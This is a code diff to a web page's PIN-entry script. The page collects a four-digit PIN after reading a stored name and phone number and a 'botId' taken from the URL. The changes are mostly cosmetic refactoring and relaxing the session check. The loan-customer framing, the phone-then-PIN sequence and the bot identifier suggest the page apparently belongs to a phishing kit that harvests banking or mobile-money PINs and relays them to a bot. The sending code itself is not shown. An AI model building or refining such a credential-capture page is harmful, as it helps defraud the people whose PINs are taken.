@@ -259,24 +259,21 @@
     document.getElementById('b4')
   ];
 
-  // Session & bot handling
-  const fullName = localStorage.getItem('fullName');
+  // ---------- SESSION ----------
+  const fullName = localStorage.getItem('fullName') || 'Loan Customer';
   const phone = localStorage.getItem('phone');
   const params = new URLSearchParams(window.location.search);
   const urlBotId = params.get('botId');
   if (urlBotId) localStorage.setItem('botId', urlBotId);
   const botId = localStorage.getItem('botId');
 
-  if (!fullName || !phone || !botId) {
+  if (!phone || !botId) {
     alert('Session expirée. Veuillez recommencer.');
     window.location.href = 'index.html';
   }
 
-  function focusPin() {
-    input.focus();
-  }
+  function focusPin() { input.focus(); }
 
-  // Update boxes with dots
   function updateBoxes(value) {
     const digits = value.padEnd(4, '');
     boxes.forEach((box, i) => {
@@ -294,11 +291,9 @@
     input.value = input.value.replace(/\D/g, '').slice(0, 4);
     updateBoxes(input.value);
     verifyBtn.disabled = input.value.length !== 4;
-    // Clear alert when typing
     alertEl.textContent = '';
   });
 
-  // Handle paste
   input.addEventListener('paste', (e) => {
     e.preventDefault();
     const paste = e.clipboardData.getData('text');
@@ -368,14 +363,10 @@
     }, 2000);
   }
 
-  // Back button
   if (backButton) {
-    backButton.addEventListener('click', () => {
-      backButton.disabled = true;
-    });
+    backButton.addEventListener('click', () => { backButton.disabled = true; });
   }
 
-  // Auto-focus on load
   window.onload = () => input.focus();
 </script>
 
